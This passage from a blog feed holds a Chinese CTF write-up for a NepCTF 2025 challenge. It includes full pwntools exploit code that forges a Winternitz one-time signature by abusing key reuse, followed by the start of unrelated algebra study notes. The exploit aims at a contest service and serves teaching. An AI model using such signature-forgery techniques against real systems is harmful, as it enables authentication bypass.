&#x27;</span>))</span><br><span class="line">            <span class="keyword">if</span> msg != <span class="string">b&#x27;happy for NepCTF 2025&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(Sign.sign(msg))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;You can&#x27;t do that&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            qq = literal_eval(<span class="built_in">input</span>(<span class="string">&#x27;give me a qq: &#x27;</span>)) <span class="comment"># 输入qq使得使得qq满足对happy for NepCTF 2025这个消息的签名</span></span><br><span class="line">            <span class="keyword">if</span> Sign.verify(<span class="string">b&#x27;happy for NepCTF 2025&#x27;</span>, qq):</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>通过解读代码其实就发现本题其实可以得到，最关键的利用点就是要想办法获取消息<code>b'happy for NepCTF 2025'</code>，签名过后的<code>qq</code>数组。</li><li>其实使用题目中现成的函数，可以得到消息<code>b'happy for NepCTF 2025'</code>的哈希值以及校验和的具体值,也就是上面代码中的<code>step</code>的值，而<code>step</code>的值代表着私钥哈希的次数。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm3</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> SystemRandom</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SM3</span>(<span class="params">data</span>):</span><br><span class="line">    d = [i <span class="keyword">for</span> i <span class="keyword">in</span> data]</span><br><span class="line">    h = sm3.sm3_hash(d)  <span class="comment"># 应该是计算一个hash值</span></span><br><span class="line">    <span class="keyword">return</span> h</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SM3_n</span>(<span class="params">data, n=<span class="number">1</span>, bits=<span class="number">256</span></span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        data = <span class="built_in">bytes</span>.fromhex(SM3(data))</span><br><span class="line">    <span class="keyword">return</span> data.<span class="built_in">hex</span>()[:bits // <span class="number">4</span>]</span><br><span class="line"><span class="comment"># 首先计算出对消息b&#x27;happy for NepCTF 2025&#x27;来说,它的step的状态</span></span><br><span class="line">msg = <span class="string">b&#x27;happy for NepCTF 2025&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">c_step</span>(<span class="params">msg</span>):</span><br><span class="line">    m = SM3_n(msg)</span><br><span class="line">    m_bin = <span class="built_in">bin</span>(<span class="built_in">int</span>(m, <span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">256</span>)</span><br><span class="line">    step = [<span class="number">0</span>]*<span class="number">48</span></span><br><span class="line">    a = [<span class="built_in">int</span>(m_bin[<span class="number">8</span> * i: <span class="number">8</span> * i + <span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span> // <span class="number">8</span>)]</span><br><span class="line">    hex_symbols = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        step[i] = a[i]</span><br><span class="line">    <span class="built_in">sum</span> = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="built_in">sum</span>[i] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">65</span>):</span><br><span class="line">            <span class="keyword">if</span> m[j - <span class="number">1</span>] == hex_symbols[i]:  <span class="comment"># 如果消息的哈希值对应索引符合hex_symbols中的某一个</span></span><br><span class="line">                <span class="built_in">sum</span>[i] += j  <span class="comment"># sum就会加上索引</span></span><br><span class="line">        step[i + <span class="number">32</span>] = <span class="built_in">sum</span>[i] % <span class="number">255</span></span><br><span class="line">    <span class="keyword">return</span> step</span><br><span class="line"></span><br><span class="line">step_des = c_step(<span class="string">b&#x27;happy for NepCTF 2025&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(step_des)</span><br></pre></td></tr></table></figure><p><img src="/2025/08/31/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/%E4%B8%80%E6%AC%A1%E6%80%A7%E7%AD%BE%E5%90%8D-WOTS/image-20250901222946617.png" alt="image-20250901222946617"></p><ul><li><p>通过观察代码就会发现，每次使用选择<code>1</code>的签名操作时，都使用的是同一个私钥进行签名，由于消息<code>b'happy for NepCTF 2025'</code>的<code>step</code>值是已知的。所以我们只要发送特殊的消息，使得该消息的<code>step1[i]&lt;=step[i]</code></p><ul><li>当<code>step1[i]&lt;step[i]</code>的时候，其实可以使用返回的<code>qq1[i]</code>，继续哈希<code>step[i]-step1[i]</code>次就能得到消息<code>b'happy for NepCTF 2025'</code>对应的<code>qq[i]</code>的值</li><li>当<code>step1[i]=step[i]</code>的时候，<code>qq1[i]==qq[i]</code></li><li>这样通过有限次的对不同的特殊消息进行签名，就可以得到<code>pp</code>这个列表的值。</li></ul></li><li><p>接下来使用下面这一串代码可以生成符合要求的消息，也就是满足<code>step1[i]&lt;=step[i]</code>的消息。</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm3</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> SystemRandom</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SM3</span>(<span class="params">data</span>):</span><br><span class="line">    d = [i <span class="keyword">for</span> i <span class="keyword">in</span> data]</span><br><span class="line">    h = sm3.sm3_hash(d)  <span class="comment"># 应该是计算一个hash值</span></span><br><span class="line">    <span class="keyword">return</span> h</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SM3_n</span>(<span class="params">data, n=<span class="number">1</span>, bits=<span class="number">256</span></span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        data = <span class="built_in">bytes</span>.fromhex(SM3(data))</span><br><span class="line">    <span class="keyword">return</span> data.<span class="built_in">hex</span>()[:bits // <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先计算出对消息b&#x27;happy for NepCTF 2025&#x27;来说,它的step的状态</span></span><br><span class="line">msg = <span class="string">b&#x27;happy for NepCTF 2025&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">c_step</span>(<span class="params">msg</span>):</span><br><span class="line">    m = SM3_n(msg)</span><br><span class="line">    m_bin = <span class="built_in">bin</span>(<span class="built_in">int</span>(m, <span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">256</span>)</span><br><span class="line">    step = [<span class="number">0</span>]*<span class="number">48</span></span><br><span class="line">    a = [<span class="built_in">int</span>(m_bin[<span class="number">8</span> * i: <span class="number">8</span> * i + <span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span> // <span class="number">8</span>)]</span><br><span class="line">    hex_symbols = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        step[i] = a[i]</span><br><span class="line">    <span class="built_in">sum</span> = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="built_in">sum</span>[i] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">65</span>):</span><br><span class="line">            <span class="keyword">if</span> m[j - <span class="number">1</span>] == hex_symbols[i]:  <span class="comment"># 如果消息的哈希值对应索引符合hex_symbols中的某一个</span></span><br><span class="line">                <span class="built_in">sum</span>[i] += j  <span class="comment"># sum就会加上索引</span></span><br><span class="line">        step[i + <span class="number">32</span>] = <span class="built_in">sum</span>[i] % <span class="number">255</span></span><br><span class="line">    <span class="keyword">return</span> step</span><br><span class="line"></span><br><span class="line">step_des = c_step(<span class="string">b&#x27;happy for NepCTF 2025&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(step_des)</span><br><span class="line">candidate = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = os.urandom(<span class="number">5</span>)</span><br><span class="line">        step = c_step(x)</span><br><span class="line">        <span class="keyword">if</span> step[i] &lt;= step_des[i]:</span><br><span class="line">            candidate.append(x.<span class="built_in">hex</span>())</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(candidate)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">candate = [&#x27;e528ac746f&#x27;, &#x27;ad694be518&#x27;, &#x27;12e5f725da&#x27;, &#x27;f38b0675a8&#x27;, &#x27;d126dd5379&#x27;, &#x27;e1bcffc062&#x27;, &#x27;f54fb14599&#x27;, &#x27;9e4ce2c549&#x27;, &#x27;42bb777a69&#x27;, &#x27;37773f0771&#x27;, &#x27;605fc06b20&#x27;, &#x27;3dd0ba0a5b&#x27;, &#x27;f01e1de8f1&#x27;, &#x27;651d6251d5&#x27;, &#x27;07e90c3714&#x27;, &#x27;2e70224c66&#x27;, &#x27;cd73d66284&#x27;, &#x27;dd270bb39b&#x27;, &#x27;0afbbf91bb&#x27;, &#x27;21954ad626&#x27;, &#x27;53c6e4b606&#x27;, &#x27;cb6632070b&#x27;, &#x27;25e43397f6&#x27;, &#x27;d6f54113c6&#x27;, &#x27;0f1dbf213f&#x27;, &#x27;8a71fbbcef&#x27;, &#x27;1e484654d5&#x27;, &#x27;c0cce89280&#x27;, &#x27;720c8fde3a&#x27;, &#x27;b42e82218b&#x27;, &#x27;8fb6002d72&#x27;, &#x27;fa4804f1af&#x27;, &#x27;ff05854709&#x27;, &#x27;0e83a61727&#x27;, &#x27;d087fccce3&#x27;, &#x27;08958c158a&#x27;, &#x27;5bc77069ea&#x27;, &#x27;b1173ddd72&#x27;, &#x27;f0bf6f2b4f&#x27;, &#x27;b144583404&#x27;, &#x27;8ebc7c5eb8&#x27;, &#x27;dd82f6435d&#x27;, &#x27;903377a152&#x27;, &#x27;f31923e8d1&#x27;, &#x27;58ab6aac57&#x27;, &#x27;6bc744f37c&#x27;, &#x27;4ca8b192b1&#x27;, &#x27;9f22cebc5f&#x27;]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><ul><li>最后使用<code>candidate</code>中的消息泄露消息<code>b'happy for NepCTF 2025'</code>的<code>qq</code>数组的值，最后再使用选项<code>2</code>认证即可。最终exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm3</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> SystemRandom</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SM3</span>(<span class="params">data</span>):</span><br><span class="line">    d = [i <span class="keyword">for</span> i <span class="keyword">in</span> data]</span><br><span class="line">    h = sm3.sm3_hash(d)  <span class="comment"># 应该是计算一个hash值</span></span><br><span class="line">    <span class="keyword">return</span> h</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SM3_n</span>(<span class="params">data, n=<span class="number">1</span>, bits=<span class="number">256</span></span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        data = <span class="built_in">bytes</span>.fromhex(SM3(data))</span><br><span class="line">    <span class="keyword">return</span> data.<span class="built_in">hex</span>()[:bits // <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先计算出对消息b&#x27;happy for NepCTF 2025&#x27;来说,它的step的状态</span></span><br><span class="line">msg = <span class="string">b&#x27;happy for NepCTF 2025&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">c_step</span>(<span class="params">msg</span>):</span><br><span class="line">    m = SM3_n(msg)</span><br><span class="line">    m_bin = <span class="built_in">bin</span>(<span class="built_in">int</span>(m, <span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">256</span>)</span><br><span class="line">    step = [<span class="number">0</span>]*<span class="number">48</span></span><br><span class="line">    a = [<span class="built_in">int</span>(m_bin[<span class="number">8</span> * i: <span class="number">8</span> * i + <span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span> // <span class="number">8</span>)]</span><br><span class="line">    hex_symbols = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        step[i] = a[i]</span><br><span class="line">    <span class="built_in">sum</span> = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="built_in">sum</span>[i] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">65</span>):</span><br><span class="line">            <span class="keyword">if</span> m[j - <span class="number">1</span>] == hex_symbols[i]:  <span class="comment"># 如果消息的哈希值对应索引符合hex_symbols中的某一个</span></span><br><span class="line">                <span class="built_in">sum</span>[i] += j  <span class="comment"># sum就会加上索引</span></span><br><span class="line">        step[i + <span class="number">32</span>] = <span class="built_in">sum</span>[i] % <span class="number">255</span></span><br><span class="line">    <span class="keyword">return</span> step</span><br><span class="line"></span><br><span class="line">step_des = c_step(<span class="string">b&#x27;happy for NepCTF 2025&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(step_des)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">candate = []</span></span><br><span class="line"><span class="string">for i in range(48):</span></span><br><span class="line"><span class="string">    while True:</span></span><br><span class="line"><span class="string">        x = os.urandom(5)</span></span><br><span class="line"><span class="string">        step = c_step(x)</span></span><br><span class="line"><span class="string">        if step[i] &lt;= step_des[i]:</span></span><br><span class="line"><span class="string">            candate.append(x.hex())</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">print(candate)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">candate = [<span class="string">&#x27;e528ac746f&#x27;</span>, <span class="string">&#x27;ad694be518&#x27;</span>, <span class="string">&#x27;12e5f725da&#x27;</span>, <span class="string">&#x27;f38b0675a8&#x27;</span>, <span class="string">&#x27;d126dd5379&#x27;</span>, <span class="string">&#x27;e1bcffc062&#x27;</span>, <span class="string">&#x27;f54fb14599&#x27;</span>, <span class="string">&#x27;9e4ce2c549&#x27;</span>, <span class="string">&#x27;42bb777a69&#x27;</span>, <span class="string">&#x27;37773f0771&#x27;</span>, <span class="string">&#x27;605fc06b20&#x27;</span>, <span class="string">&#x27;3dd0ba0a5b&#x27;</span>, <span class="string">&#x27;f01e1de8f1&#x27;</span>, <span class="string">&#x27;651d6251d5&#x27;</span>, <span class="string">&#x27;07e90c3714&#x27;</span>, <span class="string">&#x27;2e70224c66&#x27;</span>, <span class="string">&#x27;cd73d66284&#x27;</span>, <span class="string">&#x27;dd270bb39b&#x27;</span>, <span class="string">&#x27;0afbbf91bb&#x27;</span>, <span class="string">&#x27;21954ad626&#x27;</span>, <span class="string">&#x27;53c6e4b606&#x27;</span>, <span class="string">&#x27;cb6632070b&#x27;</span>, <span class="string">&#x27;25e43397f6&#x27;</span>, <span class="string">&#x27;d6f54113c6&#x27;</span>, <span class="string">&#x27;0f1dbf213f&#x27;</span>, <span class="string">&#x27;8a71fbbcef&#x27;</span>, <span class="string">&#x27;1e484654d5&#x27;</span>, <span class="string">&#x27;c0cce89280&#x27;</span>, <span class="string">&#x27;720c8fde3a&#x27;</span>, <span class="string">&#x27;b42e82218b&#x27;</span>, <span class="string">&#x27;8fb6002d72&#x27;</span>, <span class="string">&#x27;fa4804f1af&#x27;</span>, <span class="string">&#x27;ff05854709&#x27;</span>, <span class="string">&#x27;0e83a61727&#x27;</span>, <span class="string">&#x27;d087fccce3&#x27;</span>, <span class="string">&#x27;08958c158a&#x27;</span>, <span class="string">&#x27;5bc77069ea&#x27;</span>, <span class="string">&#x27;b1173ddd72&#x27;</span>, <span class="string">&#x27;f0bf6f2b4f&#x27;</span>, <span class="string">&#x27;b144583404&#x27;</span>, <span class="string">&#x27;8ebc7c5eb8&#x27;</span>, <span class="string">&#x27;dd82f6435d&#x27;</span>, <span class="string">&#x27;903377a152&#x27;</span>, <span class="string">&#x27;f31923e8d1&#x27;</span>, <span class="string">&#x27;58ab6aac57&#x27;</span>, <span class="string">&#x27;6bc744f37c&#x27;</span>, <span class="string">&#x27;4ca8b192b1&#x27;</span>, <span class="string">&#x27;9f22cebc5f&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#host = &quot;nepctf30-tjtu-vam0-ewpd-crfw4njdv208.nepctf.com&quot;</span></span><br><span class="line"><span class="comment">#port = &#x27;443&#x27;</span></span><br><span class="line"><span class="comment">#p = remote(host, port, ssl=True, sni=host)</span></span><br><span class="line">p = process([<span class="string">&#x27;python3.10&#x27;</span>,<span class="string">&#x27;server.py&#x27;</span>])</span><br><span class="line">hash_list = []</span><br><span class="line">qq = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(candate)):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;msg&#x27;</span>,candate[i].encode())</span><br><span class="line">    <span class="built_in">hash</span> = p.recvuntil(<span class="string">b&#x27;]&#x27;</span>).decode()[<span class="number">3</span>:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">hash</span> = <span class="built_in">hash</span>.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    hash_ = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">hash</span>)):</span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">0</span>:</span><br><span class="line">            hash_.append(<span class="built_in">hash</span>[j][<span class="number">1</span>:-<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            hash_.append(<span class="built_in">hash</span>[j][<span class="number">2</span>:-<span class="number">1</span>])</span><br><span class="line">    step = c_step(<span class="built_in">bytes</span>.fromhex(candate[i]))</span><br><span class="line">    t = step_des[i] - step[i]</span><br><span class="line">    <span class="comment">#print(hash_)</span></span><br><span class="line">    qq.append(SM3_n(<span class="built_in">bytes</span>.fromhex(hash_[i]),t))</span><br><span class="line">    <span class="comment">#print(qq)</span></span><br><span class="line"><span class="built_in">print</span>(qq)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;give me a qq:&#x27;</span>,<span class="built_in">str</span>(qq).encode())</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2025/08/31/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/%E4%B8%80%E6%AC%A1%E6%80%A7%E7%AD%BE%E5%90%8D-WOTS/image-20250901225954934.png" alt="image-20250901225954934"></p>]]></content>
    
    
    <summary type="html">前言：newctf2025出现了这个签名，学习一下</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="CRYPTO" scheme="http://iyheart.github.io/categories/CTF/CRYPTO/"/>
    
    <category term="数字签名" scheme="http://iyheart.github.io/categories/CTF/CRYPTO/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/"/>
    
    
  </entry>
  
  <entry>
    <title>高等代数-线性方程组</title>
    <link href="http://iyheart.github.io/2025/08/26/%E6%95%B0%E5%AD%A6blog/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0-%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/"/>
    <id>http://iyheart.github.io/2025/08/26/%E6%95%B0%E5%AD%A6blog/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0-%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/</id>
    <published>2025-08-26T09:00:37.000Z</published>
    <updated>2025-10-20T06:47:38.958Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>参考教材：<code>邱维声—高等代数大学高等代数课程创新教材</code></p></li><li><p>参考视频：<a href="https://www.bilibili.com/video/BV1jR4y1M78W?vd_source=bbdaef564df94fc8991902ba22c6761b">北大丘维声教授清华高等代数课程1080P高清修复版(全151集)</a></p></li></ul><h1 id="前言">前言</h1><ul><li>在学习高等代数之前，先对高等代数有一定的了解。高等代数研究的核心其实是其实是<code>解方程</code>，解多元一次方程以及解一元多次方程，再拓展到n元n次方程。这就是高等代数主要研究的内容。</li><li>书中前言这张图片对高等代数的概括非常好，研究的方向就是这两大线<ul><li>研究解多元一次方程的问题引入了<code>矩阵</code>、<code>向量</code>、<code>线性空间</code>等线性代数相关的内容，在线性代数中最关键的其实是<code>线性空间</code>、<code>线性映射</code></li><li>研究解一元多次方程的问题引入了<code>群</code>、<code>环</code>、<code>域</code>，最终形成了<code>抽象代数</code>这一门学科，而抽象代数的核心定理其实是<code>伽罗瓦大定理</code></li></ul></li></ul><p><img src="/2025/08/26/%E6%95%B0%E5%AD%A6blog/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0-%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/image-20250814172045086.png" alt="image-20250814172045086"></p><ul><li><code>邱维声</code>老先生的这本书的主线其实是：研究线性空间和多项式环的结构及其态射（线性映射，多项式环的通用性质），所以高等代数更多的是<strong>研究线性代数</strong>以及<strong>多项式环</strong>，而群和域这边是在抽象代数去研究。</li></ul><h1 id="线性方程组矩阵消元法">线性方程组矩阵消元法</h1><h2 id="线性方程组与矩阵">线性方程组与矩阵</h2><blockquote><p><strong>线性方程</strong>：</p><p>像$a_{1}x_1+a_2x_2+…+a_nx_n=b_1$这样，左端都是未知量$x_1,x_2,…,x_n$的一个齐次式，右端是常数被称为<strong>线性方程</strong>。</p><ul><li>系数：每个未知量前面的数称为<strong>系数</strong></li><li>常数项：右端的项被称为<strong>常数项</strong></li></ul><p><strong>线性方程组</strong>：</p><p>两个及以上的线性方程组合，就被称为<strong>线性方程组</strong>，含<code>n</code>个未知量的线性方程组被称为<code>n</code>元线性方程组，它的一般形式如下：</p><ul><li>$a_{11},a_{12},…,a_{sn}$是<strong>系数</strong></li><li>$b_1,b_2,…,b_n$是<strong>常数项</strong>，一般写在等号右边</li><li>方程个数为s与未知量个数n可以<code>相等</code>，也可以是<code>s&lt;n</code>或者<code>s&gt;n</code>的关系</li><li>将$x_1,x_2,…,x_n$代入$c_1,c_2,…,c_n$后，每个方程都变成恒等式，那么这n元有序数组$(c_1,c_2,…,c_n)$是线性方程组的<strong>一组解</strong>，方程组的所有解组成的几何称为这个方程组的解集。</li></ul><p>$$<br>\begin{cases}<br>a_{11}x_1+a_{12}x_2+…+a_{1n}x_n &amp;= b_1 \<br>a_{21}x_1+a_{22}x_2+…+a_{2n}x_n &amp;= b_2\</p><pre><code class="language-\vdots~~~~~~~~~~~~~\vdots~~~~~~~~~~~~~~~~~~~~\vdots&amp;~~~~~~\vdots\">a_&#123;s1&#125;x_1+a_&#123;s2&#125;x_2+...+a_&#123;sn&#125;x_n&amp;=b_s\end&#123;cases&#125;$$</code></pre></blockquote><blockquote><p><strong>矩阵</strong>：由于解方程都是对系数和常数项操作并没有改变未知数，所以为了方便就引入了<strong>一个数表</strong>即<strong>矩阵</strong>，将方程组的未知数前面的系数和常数项提取出来。写成如下形式：<br>$$<br>\begin{bmatrix}<br>a_{11} &amp; a_{12} &amp; \dots &amp; a_{1n} &amp; b_{1} \<br>a_{21} &amp; a_{22} &amp; \dots &amp; a_{2n} &amp; b_{2} \<br>\vdots &amp; \vdots &amp; \ddots&amp; \vdots &amp; \vdots \<br>a_{s1} &amp; a_{s2} &amp; \dots &amp; a_{sn} &amp; b_{s}<br>\end{bmatrix}<br>$$<br><strong>系数矩阵</strong>：只提取方程组的系数做为一个矩阵，这样的矩阵叫做<strong>系数矩阵</strong><br>$$<br>\begin{bmatrix}<br>a_{11} &amp; a_{12} &amp; \dots &amp; a_{1n}  \<br>a_{21} &amp; a_{22} &amp; 